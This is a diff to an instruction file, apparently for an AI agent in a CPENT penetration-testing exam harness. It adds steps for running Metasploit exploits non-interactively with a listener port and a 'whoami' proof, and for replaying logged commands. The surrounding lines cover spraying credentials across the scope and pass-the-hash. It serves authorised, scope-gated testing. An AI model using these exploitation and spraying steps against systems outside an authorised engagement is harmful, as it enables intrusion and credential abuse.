@@ -79,6 +79,13 @@ significant command, not bare shell execution.**
   tracker before brute-forcing (`bin/cpent cred list`), and **spray every new cred across
   the whole scope immediately**: `bin/cpent spray --user <u> --pass <p> --proto smb --bg`
   (or `--hash <ntlm>` for pass-the-hash). This is the highest-ROI move in the exam.
+- **Exploitation (Metasploit):** drive it **non-interactively** — never open the msfconsole
+  REPL (the harness runs one command at a time, so a REPL stalls). Use `bin/cpent msf`:
+  `msf search cve:<cve>`, `msf check <module> --ip <t>`, and
+  `msf run <module> --ip <t> --lhost auto --lport 4444 --proof "whoami"` which fires the whole
+  exploit, backgrounds the session, and proves access in one scope-gated, evidence-captured
+  shot. `-o KEY=VAL` for module options, `--payload` to override, `msf rc <file.rc> --bg` for
+  held handlers. See the `exploitation-tools` skill.
 - **Findings:** the instant you get a foothold, flag, or confirmed vuln, write a finding:
   `bin/cpent finding new ...` (or `/finding`).
 - **Network map:** update `engagement/network-map.md` every time you learn a host's
@@ -108,13 +115,17 @@ Run `/summary` periodically (every 1–2 hours) to catch gaps before they cost p
   target/zone/exit) plus a per-tool file (`nmap.md`, `crackmapexec.md`, …) of the distinct
   commands used. It builds itself as you progress and feeds the report's command-log
   appendix (`bin/cpent report`). No manual upkeep — just run commands through `bin/cpent ev`.
+  **Review/replay it** with `bin/cpent commands` (timeline), `bin/cpent commands <tool>`
+  (per-tool), or `--list`. The growing chain is a playbook: before trying something, check
+  what's already been run; to progress, pull the relevant commands back out and adapt them.
 
 ## 8. Workspace commands
 
 `bin/cpent` wraps the Python helpers. Full list:
 
 **Tracking:** `scope`, `cred`, `finding`, `target note`, `next`, `report`, `reset`
-**Automation:** `ev`, `ev-scan`, `ev-proof`, `ev-triage`, `ev-jobs`, `spray`, `screenshot`
+**Automation:** `ev`, `ev-scan`, `ev-proof`, `ev-triage`, `ev-jobs`, `spray`, `msf`,
+`commands`, `screenshot`
 **Dashboard:** `summary`, `status`, `start`
 
 **Backgrounding:** add `--bg` to `ev`/`ev-scan`/`spray` to run detached; `ev-jobs` lists
